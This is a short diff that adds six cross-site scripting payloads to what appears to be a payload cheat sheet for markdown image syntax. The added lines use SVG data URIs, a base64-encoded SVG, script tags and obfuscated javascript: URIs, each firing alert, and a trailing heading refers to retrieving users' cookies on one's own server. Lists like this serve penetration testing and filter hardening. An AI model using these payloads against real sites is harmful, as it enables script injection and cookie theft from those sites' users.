@@ -32,6 +32,12 @@
 ![XSS](x"onload="alert(1)")
 ![XSS](<"onerror="alert('XSS')>)
 ![XSS](<https://www.example.com/image.png"onerror="alert('XSS')>)
+![a](data:image/svg+xml,<svg/onload=alert(1)>)
+![a](data:image/svg+xml,<svg/onload="alert(1)">)
+![a](data:image/svg+xml;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+)
+![a](data:image/svg+xml,<svg><script>alert(1)</script></svg>)
+![a](javascript&#x3A;alert(1))
+![a](javascript:alert`1`)
 ```
 
 #### To Retrive user's Cookies on your Server
